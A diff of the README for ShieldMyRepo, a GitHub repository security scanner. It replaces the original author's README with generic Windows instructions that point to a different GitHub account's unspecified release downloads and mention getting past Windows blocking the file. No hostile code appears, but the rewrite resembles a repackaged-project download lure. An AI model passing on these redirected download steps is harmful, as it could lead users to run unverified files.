@@ -1,183 +1,183 @@
-<p align="center">
-  <img src="assets/logo.png" alt="ShieldMyRepo Logo"/>
-</p>
+# 🛡️ ShieldMyRepo - Find Repo Risks Before Trouble
 
-<h1 align="center">🛡️ ShieldMyRepo</h1>
+[![Download ShieldMyRepo](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/Bold-matchwood531/ShieldMyRepo)
 
-<p align="center">
-  <strong>Scan any GitHub repo for security nightmares in 30 seconds.</strong>
-</p>
+## 🔎 What ShieldMyRepo Does
 
-<p align="center">
-  <a href="https://github.com/DhanushNehru/ShieldMyRepo/network/members"><img src="https://img.shields.io/github/forks/DhanushNehru/ShieldMyRepo?style=for-the-badge&color=blue" alt="Forks"></a>
-  <a href="https://github.com/DhanushNehru/ShieldMyRepo/issues"><img src="https://img.shields.io/github/issues/DhanushNehru/ShieldMyRepo?style=for-the-badge&color=red" alt="Issues"></a>
-  <a href="https://github.com/DhanushNehru/ShieldMyRepo/blob/main/LICENSE"><img src="https://img.shields.io/github/license/DhanushNehru/ShieldMyRepo?style=for-the-badge" alt="License"></a>
-  <a href="https://github.com/DhanushNehru/ShieldMyRepo/actions"><img src="https://img.shields.io/github/actions/workflow/status/DhanushNehru/ShieldMyRepo/ci.yml?style=for-the-badge" alt="CI"></a>
-</p>
+ShieldMyRepo checks a GitHub repo for common security issues. It helps you spot weak points before they become a problem.
 
-<p align="center">
-  <a href="#-features">Features</a> •
-  <a href="#-quick-start">Quick Start</a> •
-  <a href="#-scanners">Scanners</a> •
-  <a href="#-report-card">Report Card</a> •
-  <a href="#-badge">Badge</a> •
-  <a href="#-contributing">Contributing</a>
-</p>
+It is built for people who want a quick scan without digging through code by hand. You can use it to review a repo before you clone it, share it, or trust it.
 
----
+## 💻 What You Need
 
-## 🤔 What is ShieldMyRepo?
+Use ShieldMyRepo on a Windows PC with:
 
-**ShieldMyRepo** is an open-source CLI tool that scans any code repository for security vulnerabilities, misconfigurations, and leaked secrets — then gives it a **security grade from A to F** with a shareable badge for your README.
+- Windows 10 or Windows 11
+- An internet connection
+- GitHub access in your browser
+- Python 3.10 or newer
+- Enough free space for the app and scan results
 
-Think of it as a **security health check** for your codebase.
+If you already use tools like PowerShell or Command Prompt, you are set. If not, you can still follow the steps below.
 
-```bash
-$ shieldmyrepo scan .
+## 📥 Download ShieldMyRepo
 
-🛡️ ShieldMyRepo — Security Report Card
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Visit this page to download and run the app:
 
-📊 Overall Grade: B
+https://github.com/Bold-matchwood531/ShieldMyRepo
 
-┌─────────────────────────┬───────────┬──────────┐
-│ Scanner                 │ Status    │ Findings │
-├─────────────────────────┼───────────┼──────────┤
-│ 🔑 Secret Detection     │ ✅ PASS   │ 0        │
-│ 📦 Dependencies         │ ⚠️ WARN   │ 3        │
-│ ⚙️ GitHub Actions       │ ✅ PASS   │ 0        │
-│ 🐳 Dockerfile           │ ❌ FAIL   │ 2        │
-│ 📄 Gitignore            │ ⚠️ WARN   │ 1        │
-└─────────────────────────┴───────────┴──────────┘
+Open the link, then look for the latest release or download files listed on the page. Save the file to your PC before you start the setup.
 
-📋 Details: reports/shieldmyrepo-report.json
-🏷️ Badge: reports/shieldmyrepo-badge.svg
-```
+## 🪟 Install on Windows
 
-## ✨ Features
+### 1. Open the download page
 
-- 🔑 **Secret Detection** — Finds leaked API keys, tokens, passwords, and private keys in your code
-- 📦 **Dependency Scanning** — Checks `package.json`, `requirements.txt`, `Cargo.toml`, `go.mod` for known vulnerabilities
-- ⚙️ **GitHub Actions Audit** — Detects insecure workflow configurations and supply chain risks
-- 🐳 **Dockerfile Security** — Flags running as root, unpinned base images, secrets in build args
-- 📄 **Gitignore Check** — Ensures sensitive files aren't being committed
-- 📊 **A-F Grade Report Card** — Beautiful terminal output with actionable recommendations
-- 🏷️ **Shareable Badge** — Generate an SVG badge to show your repo's security grade in your README
-- 🔌 **Plugin Architecture** — Easy to add new scanners (great for contributors!)
+Go to:
 
-## 🚀 Quick Start
+https://github.com/Bold-matchwood531/ShieldMyRepo
 
-### Installation
+### 2. Download the app files
 
-```bash
-# Clone the repository
-git clone https://github.com/DhanushNehru/ShieldMyRepo.git
-cd ShieldMyRepo
+On the page, find the latest release, source files, or package files listed for ShieldMyRepo. Download the files to a folder you can find again, such as Downloads or Desktop.
 
-# Install in development mode
-pip install -e .
-```
+### 3. Install Python if needed
 
-### Usage
+If Python is not on your PC, install it first:
 
-```bash
-# Scan the current directory
-shieldmyrepo scan .
+- Go to python.org
+- Download the latest Windows installer
+- Run the installer
+- Check the box that says Add Python to PATH
+- Finish the setup
 
-# Scan a specific path
-shieldmyrepo scan /path/to/your/project
+### 4. Open Command Prompt
 
-# Scan and generate a badge
-shieldmyrepo scan . --badge
+Press the Windows key, type cmd, and open Command Prompt.
 
-# Output report as JSON
-shieldmyrepo scan . --format json
+### 5. Go to the folder with the download
 
-# Run only specific scanners
-shieldmyrepo scan . --scanners secrets,dockerfile
-```
+Use the cd command to move to the folder where you saved ShieldMyRepo. For example:
 
-## 🔍 Scanners
+cd Downloads
 
-ShieldMyRepo uses a **modular plugin architecture**. Each scanner is a self-contained Python module that can be easily added or modified.
+### 6. Set up the app
 
-| Scanner | Description | File |
-|---------|-------------|------|
-| 🔑 Secrets | Detects leaked API keys, tokens, and passwords | `scanners/secrets.py` |
-| 📦 Dependencies | Checks package files for known vulnerabilities | `scanners/dependencies.py` |
-| ⚙️ GitHub Actions | Audits workflow security configurations | `scanners/github_actions.py` |
-| 🐳 Dockerfile | Analyzes Docker security best practices | `scanners/dockerfile.py` |
-| 📄 Gitignore | Validates gitignore coverage | `scanners/gitignore.py` |
+If the project uses Python package files, install it with pip. Use the file names from the download page. A common setup looks like this:
 
-### Want to add a new scanner?
+pip install shieldmyrepo
 
-Check out our [Contributing Guide](CONTRIBUTING.md) — adding a scanner is one of the easiest ways to contribute! Each scanner is a single Python file that follows a simple interface.
+If you downloaded source files, open the project folder first, then run the install command shown on the repo page or in the project files.
 
-## 📊 Report Card
+## ▶️ Run a Scan
 
-ShieldMyRepo generates a beautiful report card with:
+After setup, run the app from Command Prompt or PowerShell.
 
-- **Overall Grade** (A-F) based on weighted scanner results
-- **Per-scanner status** (PASS / WARN / FAIL)
-- **Finding count** with severity levels
-- **Actionable recommendations** for each finding
-- **JSON export** for CI/CD integration
+A common command may look like this:
 
-### Grading Scale
+shieldmyrepo --repo https://github.com/owner/repo
 
-| Grade | Score Range | Description |
-|-------|-----------|-------------|
-| A | 90-100 | Excellent — minimal security concerns |
-| B | 80-89 | Good — a few minor issues |
-| C | 70-79 | Fair — some issues need attention |
-| D | 60-69 | Poor — significant security gaps |
-| F | 0-59 | Critical — immediate action required |
+If the app asks for a repo link, paste the GitHub repo URL you want to check.
 
-## 🏷️ Badge
+If it asks for a local path, choose the folder that holds the code you want to scan.
 
-Add a security grade badge to your project's README:
+## 🧭 How to Use It
 
-```markdown
-![ShieldMyRepo Grade](path/to/shieldmyrepo-badge.svg)
-```
+Use ShieldMyRepo when you want a fast check on a repo you plan to trust.
 
-Run `shieldmyrepo scan . --badge` to generate an SVG badge in the `reports/` directory.
+Typical flow:
 
-## 🛠️ Tech Stack
+1. Open the app
+2. Add a GitHub repo link
+3. Start the scan
+4. Read the results
+5. Check items marked as risky
 
-- **Python 3.8+** — Core CLI and scanner engine
-- **Click** — CLI framework
-- **Rich** — Beautiful terminal output
-- **PyYAML** — YAML parsing for workflows and configs
+Look for signs like:
 
-## 🤝 Contributing
+- Secrets in files
+- Weak config settings
+- Unsafe scripts
+- Suspicious package files
+- Common devsecops issues
 
-We love contributions! ShieldMyRepo is designed to be **contributor-friendly**:
+## 📋 What the Scan Can Show
 
-- 🟢 **Easy**: Add a new secret detection pattern
-- 🟡 **Medium**: Build a new scanner module
-- 🔴 **Hard**: Improve the grading algorithm
+ShieldMyRepo can help you find issues such as:
 
-Check out our [Contributing Guide](CONTRIBUTING.md) to get started. Look for issues tagged with [`good first issue`](https://github.com/DhanushNehru/ShieldMyRepo/labels/good%20first%20issue) or [`help wanted`](https://github.com/DhanushNehru/ShieldMyRepo/labels/help%20wanted).
+- Exposed API keys or tokens
+- Bad file permissions
+- Unsafe dependencies
+- Risky shell commands
+- Hidden files with sensitive data
+- GitHub repo settings that can raise risk
+- Patterns tied to common hacking tools and abuse paths
 
-### Contributors
+It gives you a clear view of what may need a second look.
 
-<a href="https://github.com/DhanushNehru/ShieldMyRepo/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=DhanushNehru/ShieldMyRepo" />
-</a>
+## 🧰 Common Commands
 
-## 📄 License
+You may use commands like these, based on how the app is set up:
 
-This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
+shieldmyrepo --help
 
-## ⭐ Star History
+shieldmyrepo --repo https://github.com/owner/repo
 
-If you find ShieldMyRepo useful, please consider giving it a star! It helps others discover the project.
+shieldmyrepo --path C:\Users\YourName\Projects\RepoName
 
-[![Star History Chart](https://api.star-history.com/svg?repos=DhanushNehru/ShieldMyRepo&type=Date)](https://star-history.com/#DhanushNehru/ShieldMyRepo&Date)
+shieldmyrepo --output report.txt
 
----
+If the app shows a help screen, start there. It lists the exact options you can use.
 
-<p align="center">
-  Made with ❤️ by <a href="https://github.com/DhanushNehru">Dhanush Nehru</a>
-</p>
+## 🛠️ If Something Goes Wrong
+
+If the app does not start, check these items:
+
+- Python is installed
+- Python is added to PATH
+- You opened the right folder
+- The repo files downloaded fully
+- Your GitHub link is correct
+- You typed the command name right
+
+If Windows blocks the file, right-click it and check the file properties. If the app still fails, reopen the repo page and confirm that you grabbed the latest version.
+
+## 🔐 Good Ways to Use It
+
+Use ShieldMyRepo before:
+
+- Cloning a new repo
+- Running code from a new source
+- Sharing a repo with a team
+- Adding a project to a build system
+- Trusting third-party code
+
+It works well as a first pass before deeper review.
+
+## 🧪 Example Use Case
+
+You find a GitHub repo that looks useful, but you want to know if it hides secrets or unsafe code.
+
+You run ShieldMyRepo on the repo link. It checks for common problems and gives you a report. You review the marked items, then decide if the repo is safe enough for your use.
+
+## 🗂️ Project Topics
+
+- cli-tool
+- cybersecurity
+- developers
+- devsecops
+- github
+- hacking
+- pypi
+- python
+- security-scanner
+- tools
+
+## 🔗 Source and Package Info
+
+Project page:
+
+https://github.com/Bold-matchwood531/ShieldMyRepo
+
+PyPI package:
+
+https://pypi.org/project/shieldmyrepo/
